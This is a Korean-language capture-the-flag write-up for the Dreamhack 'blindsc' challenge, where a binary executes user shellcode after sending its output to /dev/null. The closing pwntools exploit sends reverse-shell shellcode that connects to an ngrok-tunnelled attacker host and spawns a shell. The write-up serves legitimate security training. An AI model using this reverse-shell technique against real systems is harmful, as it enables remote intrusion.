# blindsc

[문제 링크](https://dreamhack.io/wargame/challenges/1018)

    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

## 소스코드

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbx
  __int64 v4; // rbx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  __int64 v18; // rbx
  int fd; // [rsp+24h] [rbp-1Ch]
  void (*v21)(void); // [rsp+28h] [rbp-18h]

  setup();
  printf("Input shellcode: ");
  read(0, &buf, 0x100u);
  v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0);
  v3 = qword_4068;
  *(_QWORD *)v21 = buf;
  *((_QWORD *)v21 + 1) = v3;
  v4 = qword_4078;
  *((_QWORD *)v21 + 2) = qword_4070;
  *((_QWORD *)v21 + 3) = v4;
  v5 = qword_4088;
  *((_QWORD *)v21 + 4) = qword_4080;
  *((_QWORD *)v21 + 5) = v5;
  v6 = qword_4098;
  *((_QWORD *)v21 + 6) = qword_4090;
  *((_QWORD *)v21 + 7) = v6;
  v7 = qword_40A8;
  *((_QWORD *)v21 + 8) = qword_40A0;
  *((_QWORD *)v21 + 9) = v7;
  v8 = qword_40B8;
  *((_QWORD *)v21 + 10) = qword_40B0;
  *((_QWORD *)v21 + 11) = v8;
  v9 = qword_40C8;
  *((_QWORD *)v21 + 12) = qword_40C0;
  *((_QWORD *)v21 + 13) = v9;
  v10 = qword_40D8;
  *((_QWORD *)v21 + 14) = qword_40D0;
  *((_QWORD *)v21 + 15) = v10;
  v11 = qword_40E8;
  *((_QWORD *)v21 + 16) = qword_40E0;
  *((_QWORD *)v21 + 17) = v11;
  v12 = qword_40F8;
  *((_QWORD *)v21 + 18) = qword_40F0;
  *((_QWORD *)v21 + 19) = v12;
  v13 = qword_4108;
  *((_QWORD *)v21 + 20) = qword_4100;
  *((_QWORD *)v21 + 21) = v13;
  v14 = qword_4118;
  *((_QWORD *)v21 + 22) = qword_4110;
  *((_QWORD *)v21 + 23) = v14;
  v15 = qword_4128;
  *((_QWORD *)v21 + 24) = qword_4120;
  *((_QWORD *)v21 + 25) = v15;
  v16 = qword_4138;
  *((_QWORD *)v21 + 26) = qword_4130;
  *((_QWORD *)v21 + 27) = v16;
  v17 = qword_4148;
  *((_QWORD *)v21 + 28) = qword_4140;
  *((_QWORD *)v21 + 29) = v17;
  v18 = qword_4158;
  *((_QWORD *)v21 + 30) = qword_4150;
  *((_QWORD *)v21 + 31) = v18;
  puts("\nNot gonna show you the result!");
  fd = open("/dev/null", 2);
  dup2(fd, 0);
  dup2(fd, 1);
  dup2(fd, 2);
  v21();
  return 0;
}
```

## 문제 분석

```c
printf("Input shellcode: ");
read(0, &buf, 0x100u);
v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0);
// ...
v21();
```

이 코드를 통해 사용자의 입력을 받아 실행 가능한 메모리에 올려둔다. 그 후 `v21()`을 통해 사용자가 입력한 명령어를 실행하게 된다.

하지만 다음 코드를 통해 표준 입력, 표준 출력, 표준 에러를 날려버린다.

```c
fd = open("/dev/null", 2);   // /dev/null 열기 (O_RDWR)
dup2(fd, 0);                  // fd를 0번(표준입력)에 복사
dup2(fd, 1);                  // fd를 1번(표준출력)에 복사  
dup2(fd, 2);                  // fd를 2번(표준에러)에 복사
```

그렇기 때문에 리버스 쉘을 통해 쉘을 얻는 것이 가장 쉬워보인다.

`ngrok` 을 사용하면 리버스 쉘을 쉽게 연결할 수 있다.

```sh
ngrok tcp 444
```



## 익스플로잇

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

TARGET = "host3.dreamhack.games"
TARGET_PORT = 23295

ATTACKER_IP = "0.tcp.jp.ngrok.io" # ngrok을 통해 받아낸 ip주소
ATTACKER_PORT = 26804 # ngrok 포트번호

shellcode = shellcraft.connect(ATTACKER_IP, ATTACKER_PORT)
shellcode += shellcraft.findpeersh(ATTACKER_PORT)

p = remote(TARGET, TARGET_PORT)
p.sendafter(b"Input shellcode: ", asm(shellcode))
p.close()
```

